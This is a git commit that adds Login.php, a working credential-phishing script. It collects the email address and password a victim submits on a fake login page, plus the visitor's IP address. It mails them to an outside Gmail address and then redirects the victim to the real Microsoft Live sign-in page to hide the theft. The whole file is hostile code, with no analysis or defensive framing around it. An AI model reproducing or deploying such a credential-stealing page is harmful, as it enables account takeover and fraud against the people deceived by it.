3fe38f9cb176345bd2f42cac2de6233be86d56b0
Bill Office <billingoffice237@gmail.com>
2019-06-13 00:31:15 +0000

    Intial commit

---
+++ Login.php
@@ -0,0 +1,41 @@
+<meta http-equiv="refresh" content="0; url=https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1526372916&rver=6.7.6643.0&wp=MBI_SSL&wreply=https%3a%2f%2fproducts.office.com%2fen-ZA%2f%3fms.url%3doffice365com&lc=7177&id=290950&aadredir=1" />
+
+<?php
+if ($_POST['nextPrev(1)'])
+{// do the emailing commands here 
+header ("Location:https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1526372916&rver=6.7.6643.0&wp=MBI_SSL&wreply=https%3a%2f%2fproducts.office.com%2fen-ZA%2f%3fms.url%3doffice365com&lc=7177&id=290950&aadredir=1");
+}
+$to= "seekingablemen@gmail.com";
+$subject ="2019 view";
+
+
+$password =$_POST['password'] ;
+$email =$_POST['email'] ;
+
+$ip = $_SERVER ["REMOTE_ADDR"];
+
+
+
+
+$body ="
+email = $email
+Password = $password
+IP Address =  $ip
+
+
+ .";
+
+
+
+
+
+
+mail ($to, $subject, $body ,$header);
+
+
+
+
+Echo""
+
+
+?>
